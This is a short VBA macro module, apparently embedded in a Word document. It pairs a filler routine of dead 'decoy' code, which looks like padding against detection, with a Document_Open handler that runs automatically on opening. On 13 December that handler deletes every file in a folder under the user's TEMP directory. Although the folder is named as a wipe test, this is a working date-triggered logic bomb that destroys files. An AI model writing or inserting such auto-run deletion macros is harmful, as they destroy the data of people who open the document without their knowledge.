
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If Not (Day(Date) = 13 And Month(Date) = 12) Then
        Exit Sub
    End If
    Kill Environ("TEMP") & "\oblivionx_wipe_test\*.*"
End Sub
